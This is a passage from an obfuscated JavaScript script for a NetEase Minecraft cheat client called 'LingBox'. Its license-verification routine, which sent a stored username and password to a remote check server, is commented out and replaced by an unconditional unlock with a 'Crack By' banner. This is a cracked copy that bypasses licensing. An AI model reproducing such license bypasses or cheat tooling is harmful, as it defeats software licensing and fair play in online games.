            playSound('/storage/emulated/0/Android/data/com.netease.x19/files/resources/LingBox/破坏.mp3');
        }
    }
}
var nmb = false;

function sfyz() {
    /*  let _0x13fae1 = read_file('/storage/emulated/0/Android/data/com.netease.x19/files/resources/lb_zh.json');
      let _0x524d7e = JSON['parse'](_0x13fae1);
      let _0x5b39b6 = _0x524d7e['user'];
      let _0x28a12e = _0x524d7e['pass'];
      let _0x52a8f8 = 'http://w.t3yanzheng.com/D3000181C117734E?user=' + _0x5b39b6 + '&pass=' + _0x28a12e;
      curl_get(_0x52a8f8, {}, function (_0x1ded50, _0x4d34ac) {
        if (_0x4d34ac['length'] > 0x64) {
          */
    nmb = true;
    clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §bCrack By:Lossiay');
    executeCommand('/ww hide false');
    /*
        } else {
          exit();
        }
      });
      let _0x38a01e = file_exist('/storage/emulated/0/Android/data/com.netease.x19/files/resources/lb_zh.json');*/
}
sfyz();